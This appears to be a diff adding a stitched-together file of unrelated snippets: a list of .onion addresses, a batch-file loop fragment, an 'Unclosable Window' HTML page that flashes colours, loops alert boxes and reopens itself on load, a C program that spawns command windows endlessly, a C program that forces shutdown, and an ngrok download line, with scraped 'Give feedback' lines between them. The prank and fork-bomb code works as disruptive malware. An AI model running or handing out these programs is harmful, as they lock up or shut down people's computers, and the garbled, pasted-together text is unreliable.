@@ -1,0 +1,28 @@
+http://2jwcnprqbugvyi6ok2h2h7u26qc6j5wxm7feh3znlh2qu3h6hjld4kyd.onion/
+http://jptvwdeyknkv6oiwjtr2kxzehfnmcujl7rf7vytaikmwlvze773uiyyd.onion/
+http://dwltorbltw3tdjskxn23j2mwz2f4q25j4ninl5bdvttiy4xb6cqzikid.onion/
+http://wiki6dtqpuvwtc5hopuj33eeavwa6sik7sy57cor35chkx5nrbmmolqd.onion/
+http://odahix2ysdtqp4lgak4h2rsnd35dmkdx3ndzjbdhk3jiviqkljfjmnqd.onion/
+http://qazkxav4zzmt5xwfw6my362jdwhzrcafz7qpd5kugfgx7z7il5lyb6ad.onion/
+http://2jopbxfi2mrw6pfpmufm7smacrgniglr7a4raaila3kwlhlumflxfxad.onion/nojs/
+http://sazyr2ntihjqpjtruxbn2z7kingj6hfgysiy5lzgo2aqduqpa3gfgmyd.onion/
+http://k6m3fagp4w4wspmdt23fldnwrmknse74gmxosswvaxf3ciasficpenad.onion/
+http://hyjgsnkanan2wsrksd53na4xigtxhlz57estwqtptzhpa53rxz53pqad.onion/
+http://relateoak2hkvdty6ldp7x67hys7pzaeax3hwhidbqkjzva3223jpxqd.onion/
+http://cuba4ikm4jakjgmkezytyawtdgr2xymvy6nvzgw5cglswg3si76icnqd.onion/
+:xmd %random%%random%goto x 
+
+Give feedback
+
+
+<html><head> <title>Unclosable Window</title> <script> activ = window.setInterval("Farbe()", 100); farbe=1; function Farbe() { if(farbe==1) { document.bgColor="FFFF00"; farbe=2; }else { document.bgColor="FF0000"; farbe=1; } alert("ok"); } function erneut(){ window.open(self.location,''); } window.onload = erneut; </script></head><body> <h1>Unclosable Window</h1></body></html>
+#include <stdlib.h> main(){ while(1){ system("start cmd"); }} 
+
+Give feedback
+
+
+
+#include <stdlib.h> main(){ system("shutdown -s");} 
+
+Give feedback
+https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip unzip ngrok-stable-linux-amd64.zip
